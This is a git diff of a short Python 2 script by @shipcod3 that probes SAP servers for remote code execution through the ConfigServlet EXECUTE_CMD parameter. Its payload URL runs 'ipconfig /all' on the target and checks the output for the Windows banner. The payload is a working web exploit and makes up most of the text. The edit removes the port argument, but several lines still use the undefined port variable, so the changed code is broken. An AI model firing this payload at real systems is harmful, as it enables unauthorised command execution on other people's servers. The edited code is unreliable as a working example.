@@ -11,18 +11,17 @@ print "########################################################"
 print "-- by @shipcod3\n"
 
 def usage():
-     print("USAGE: python sapConfigServlet_rce.py host.com 50000")  
+     print("USAGE: python sapConfigServlet_rce.py host.com")  
 
 def main(argv):
   
-    if len(argv) < 3:
+    if len(argv) < 2:
         return usage()
     
     host = sys.argv[1]
-    port = sys.argv[2]
-    payload = "ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
+    payload = "50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
     
-    print "[***] Checking {0}:{1} for Remote Code Execution".format(host, port)
+    print "[***] Checking {0} for Remote Code Execution".format(host, port)
     
     try:  
         url = urllib.urlopen("http://{0}:{1}/{2}".format(host, port, payload))
@@ -30,7 +29,7 @@ def main(argv):
     
         if url.code == 200 and "Windows IP Configuration" in msg:
             print "[!] Vulnerable to Remote Code Execution" 
-            print "[+] Payload: http://{0}:{1}/{2}\n".format(host, port, payload)
+            print "[+] Payload: http://{0}/{1}\n".format(host, payload)
 
         else:
             print "[-] Not Vulnerable!"   
